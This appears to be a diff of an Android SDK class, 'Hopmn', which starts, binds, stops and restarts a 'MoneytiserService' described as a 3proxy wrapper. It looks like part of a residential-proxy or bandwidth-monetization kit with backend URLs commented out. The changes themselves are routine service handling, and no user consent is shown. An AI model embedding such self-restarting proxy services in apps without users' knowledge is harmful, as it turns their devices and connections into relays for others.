@@ -52,7 +52,11 @@ public class Hopmn extends BroadcastReceiver {
     public static final String FOREGROUND_PLACE_HOLDER = "{foreground}";
 
 
-/*    private static final String DEFAULT_BASE_URL  = "https://{country}-{publisher}.stupidthings.online";
+   /* private static final String DEFAULT_BASE_URL  = "https://{country}-{publisher}.filesynced.xyz";
+    private static final String DEFAULT_REG_URL  = "https://{publisher}.filesynced.xyz";
+    private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.filesynced.xyz";
+    private static final String SECURE_REG_URL  = "https://{publisher}.filesynced.xyz";*/
+   /* private static final String DEFAULT_BASE_URL  = "https://{country}-{publisher}.stupidthings.online";
     private static final String DEFAULT_REG_URL  = "https://{publisher}.stupidthings.online";
     private static final String SECURE_BASE_URL  = "https://{country}-{publisher}.stupidthings.online";
     private static final String SECURE_REG_URL  = "https://{publisher}.stupidthings.online";*/
@@ -259,36 +263,40 @@ public class Hopmn extends BroadcastReceiver {
      * Start the 3proxy wrapper service.
      */
     @Keep
-    public void start() throws InterruptedException {
+    public boolean start()  {
         Hopmn.userStopRequest = false;
-        Intent intent = new Intent();
-        intent.setClass(mContext, MoneytiserService.class);
-        mHttpManager.start();
-        intent.putExtra(NEED_FOREGROUND_KEY, false);
-        /*if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !isTV())
-        {
-            intent.putExtra(ASYNC_JOB_SCHEDULER_KEY, true);
-        }*/
+        Context appContext = mContext.getApplicationContext();
+
+        Intent intent = new Intent(appContext, MoneytiserService.class);
+        intent.putExtra(NEED_FOREGROUND_KEY, true);
         try {
-            if(isForegroundRunning() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {
-                intent.putExtra(NEED_FOREGROUND_KEY, true);
-                mContext.startForegroundService(intent);
+            mHttpManager.start();
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {
+                appContext.startForegroundService(intent);
             }
             else {
-                mContext.startService(intent);
+                appContext.startService(intent);
             }
-           /* if( Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !isTV()) {
-                String gap = mDataStore.get(mContext.getString(R.string.hopmon_interval_key));
-                long interval = (gap!=null && !gap.isEmpty())? Long.parseLong(gap) : DEFAULT_JOBSERVICE_DELAY;
-                //    scheduleJob(DEFAULT_JOBSERVICE_DELAY);
-                scheduleAsyncJob(interval);
-            }*/
+
+            if (!proxyServiceConnection.isBound()) {
+                try {
+                    appContext.bindService(
+                            intent,
+                            proxyServiceConnection,
+                            Context.BIND_AUTO_CREATE
+                    );
+                } catch (Exception bindEx) {
+                    LogUtils.e("Hopmn", "bindService failed", bindEx);
+                }
+            }
+            LogUtils.d("Hopmn", "start() requested MoneytiserService");
+            return true;
         }
         catch(Exception ex)
         {
-            LogUtils.e("Hopmn", "start() failed on startService() with sdk "+ Build.VERSION.SDK_INT );
+            LogUtils.e("Hopmn", "start() failed on SDK " + Build.VERSION.SDK_INT, ex);
+            return false;
         }
-        mContext.bindService(intent, proxyServiceConnection, Context.BIND_AUTO_CREATE);
     }
 
     /**
@@ -296,11 +304,21 @@ public class Hopmn extends BroadcastReceiver {
      */
     @Keep
     public void stop() {
-        if (proxyServiceConnection.isBound()) {
-            mContext.unbindService(proxyServiceConnection);
-        }
         userStopRequest = true;
-        mContext.stopService(new Intent(mContext, MoneytiserService.class));
+
+        Context appContext = mContext.getApplicationContext();
+        try {
+            if (proxyServiceConnection.isBound()) {
+                appContext.unbindService(proxyServiceConnection);
+            }
+        } catch (Exception ex) {
+            LogUtils.e("Hopmn", "unbindService failed", ex);
+        }
+        try {
+            appContext.stopService(new Intent(appContext, MoneytiserService.class));
+        } catch (Exception ex) {
+            LogUtils.e("Hopmn", "stopService failed", ex);
+        }
     }
 
     @Override
@@ -312,8 +330,11 @@ public class Hopmn extends BroadcastReceiver {
         if(intent.getBooleanExtra(Hopmn.NEED_RESTART_KEY, false)){
             try {
                 LogUtils.w("receiver", "Restarting Hopmn Service");
-                start();
-            } catch (InterruptedException e) {
+                if(start()!= true)
+                {
+                    LogUtils.w("receiver", "Failed To restart Hopmn Service");
+                }
+            } catch (Exception e) {
                 LogUtils.w("receiver", "Failed To restart Hopmn Service");
             }
         }
@@ -321,7 +342,7 @@ public class Hopmn extends BroadcastReceiver {
 
     @Keep
     public boolean isRunning() {
-        return proxyServiceConnection.isBound() && proxyServiceConnection.getMoneytiserService().isRunning();
+        return proxyServiceConnection.isBound() && proxyServiceConnection.getMoneytiserService() != null && proxyServiceConnection.getMoneytiserService().isRunning();
     }
 
     @Keep
